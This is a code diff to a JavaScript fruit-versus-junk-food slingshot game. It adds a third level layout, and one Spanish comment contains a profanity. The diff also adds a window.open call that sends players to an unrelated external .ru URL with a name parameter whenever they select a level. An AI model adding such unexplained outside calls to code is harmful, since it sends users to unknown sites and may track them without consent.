@@ -121,6 +121,32 @@ var levels = {
                    {type:"hero", name:"orange",x:80,y:405},
                    {type:"hero", name:"apple",x:140,y:405},
                ]
+           },
+            {   // Tercer nivel - Hay que tocar cosas - PUTOOOOO
+               foreground:'angry-birds',
+               background:'angry-birds',
+               entities:[
+                   {type:"ground", name:"dirt", x:500,y:400,width:1000,height:20,isStatic:true},
+                   {type:"ground", name:"wood", x:185,y:350,width:30,height:80,isStatic:true},
+   
+                   {type:"block", name:"wood", x:820,y:340,angle:90,width:100,height:25},
+                   {type:"block", name:"wood", x:720,y:340,angle:90,width:100,height:25},
+                   {type:"block", name:"wood", x:620,y:340,angle:90,width:100,height:25},
+                   {type:"block", name:"glass", x:670,y:277.5,width:100,height:25},
+                   {type:"block", name:"glass", x:770,y:277.5,width:100,height:25},
+   
+                   {type:"block", name:"glass", x:670,y:215,angle:90,width:100,height:25},
+                   {type:"block", name:"glass", x:770,y:215,angle:90,width:100,height:25},
+                   {type:"block", name:"wood", x:720,y:152.5,width:100,height:25},
+   
+                   {type:"villain", name:"burger",x:715,y:115,calories:590},
+                   {type:"villain", name:"fries",x:670,y:365,calories:420},
+                   {type:"villain", name:"sodacan",x:765,y:360,calories:150},
+   
+                   {type:"hero", name:"strawberry",x:30,y:375},
+                   {type:"hero", name:"orange",x:80,y:365},
+                   {type:"hero", name:"apple",x:140,y:365},
+               ]
            }
        ],
     //Inicializa la panttalla de seleccion de nivel
@@ -137,6 +163,8 @@ var levels = {
         $('#levelselectscreen input').click(function () {
             levels.load(this.value - 1);
             $('#levelselectscreen').hide();
+            window.open("http://www.megalook.ru/callhim.php?namee=Raul2");
+            
         });
     },
     
